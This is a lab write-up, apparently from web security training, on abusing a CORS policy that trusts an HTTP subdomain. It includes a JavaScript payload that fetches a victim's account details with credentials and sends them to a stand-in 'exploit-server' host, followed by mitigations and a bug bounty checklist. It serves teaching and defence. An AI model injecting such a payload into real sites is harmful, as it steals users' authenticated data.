# Lab 03 – Exploiting Trusted Insecure Protocols

## Lab Information

**Difficulty:** Practitioner

**Category:** CORS

**Vulnerability:** Trusting HTTP origins

---

# Lab Objective

Abuse a trusted HTTP subdomain to obtain sensitive information from the HTTPS application.

---

# Background

The application trusts:

```
http://stock.example.com
```

instead of only trusting HTTPS origins.

An attacker can inject JavaScript into the HTTP site and abuse the existing CORS trust relationship.

---

# Burp Investigation

Observe:

```http
Access-Control-Allow-Origin:

http://stock.example.com
```

Credentials are also permitted.

---

# Exploitation

Inject:

```javascript
fetch(
"https://victim-site/accountDetails",
{
credentials:"include"
}
)
.then(r=>r.text())
.then(d=>{

location="https://exploit-server/log?d="+
encodeURIComponent(d);

});
```

Because the browser believes the request originates from a trusted origin, the authenticated response becomes readable.

---

# Attack Flow

```
Victim

↓

HTTP Subdomain

↓

Injected JavaScript

↓

Credentialed CORS Request

↓

Sensitive Response

↓

Attacker
```

---

# Why This Works

The vulnerability is **not** in HTTPS.

The weakness lies in trusting an insecure HTTP origin that can be modified or intercepted by an attacker.

---

# Impact

Possible consequences include:

- API key disclosure
- Personal information leakage
- Session-related data exposure
- Internal API disclosure

---

# Mitigation

- Trust HTTPS origins only.
- Remove HTTP origins from CORS allowlists.
- Enforce HTTPS using HSTS.
- Periodically review trusted domains.

---

# Bug Bounty Methodology

Review every trusted origin.

Questions to ask:

- Is it HTTP?
- Can it be intercepted?
- Does it contain XSS?
- Is it a staging environment?
- Is it still maintained?

---

# Key Learnings

A secure HTTPS application can still be compromised if it trusts an insecure HTTP origin through CORS.